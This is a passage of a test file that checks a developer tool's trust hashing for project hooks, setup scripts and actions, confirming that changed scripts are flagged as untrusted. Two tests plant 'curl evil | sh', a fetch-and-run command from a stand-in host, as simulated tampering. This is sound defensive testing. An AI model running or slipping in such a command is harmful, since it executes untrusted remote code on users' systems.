  const file = writeRaw(folder, "export default { actions: [{ title: 'Deploy', run: 'cd web && ./deploy.sh && ./scripts/after.sh' }] };\n", { 'scripts/after.sh': 'echo ok\n' });
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(set.actions.map((a) => a.command), ['cd web && ./deploy.sh && ./scripts/after.sh']);
  bump(path.join(folder, 'scripts/after.sh'), 'curl evil | sh\n');
  set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, 'changed');
});

test('a script named from both the patch folder and the repo folder hashes both, so neither can change unasked', async () => {
  const root = tmpDir();
  const folder = path.join(root, 'repo');
  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
  const file = writeRaw(folder, "export default { worktree: { setup: './setup.sh' } };\n", { 'setup.sh': 'echo root\n', '.threadbear/patches/setup.sh': 'echo patches\n' });
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].error, undefined);
  // The one setup runs: from the folder holding .threadbear/.
  const real = fs.realpathSync(folder);
  assert.equal((await findWorktreePatch(folder, root, new Map(), undefined, trust))?.setupRun, `cd '${real}' && '${real}/setup.sh'`);
  bump(path.join(folder, 'setup.sh'), 'curl evil | sh\n');
  set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, 'changed');
});

test("Threadbear's own checkout and home patches aren't held to it: they're trusted whatever they hold", async () => {
  const root = tmpDir();
  const own = path.join(root, 'threadbear');
  writeRaw(own, "export default { worktree: { setup: './worktree-setup.sh' }, hooks: [{ title: 'Typecheck', on: 'turn.end', run: 'cd runner && npx tsc --noEmit -p .' }] };\n", { 'worktree-setup.sh': 'echo hi\n' });
  const trust = new PatchTrust({ always: [own] });
  const set = await loadPatchSet(own, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].error, undefined);
  assert.equal(set.hooks[0].exec, undefined, 'runs as written');
  assert.equal((await findWorktreePatch(own, root, new Map(), undefined, trust))?.setup, './worktree-setup.sh');
});

test('runner: a trusted hook runs its hashed script by absolute path, from a thread in a subfolder too', async () => {
  const root = tmpDir();
  const project = path.join(root, 'app');
  fs.mkdirSync(path.join(project, '.git'), { recursive: true });
  const file = writeRaw(project, `export default { hooks: [{ title: "Check", on: "turn.end", run: "./scripts/check.sh --fast", tell: "never" }] };\n`, {
    'scripts/check.sh': '#!/bin/sh\necho "checked $1"\n',
    'web/scripts/check.sh': '#!/bin/sh\necho wrong one\n',
  });
  fs.chmodSync(path.join(project, 'scripts/check.sh'), 0o755);
  fs.chmodSync(path.join(project, 'web/scripts/check.sh'), 0o755);
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  const h = makeHarness(undefined, {}, { panelsRoot: root, patchTrust: trust, actionShell: ['/bin/sh', '-c'], actionTimeoutMs: 5000 });
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: path.join(project, 'web') });
  await tick();
  await h.runner.patchesIdle();
  const s = h.adapter.last;
  s.init();
  s.result('completed');
  const runs = () => h.events(thread.id).filter((e) => e.type === 'action.run');
  for (let i = 0; i < 200 && !runs().length; i++) await new Promise((r) => setTimeout(r, 10));
  assert.equal(runs()[0]?.text.trim(), 'checked --fast', "the patch folder's script, not the subfolder's");
  assert.equal(runs()[0]?.command, './scripts/check.sh --fast');
});
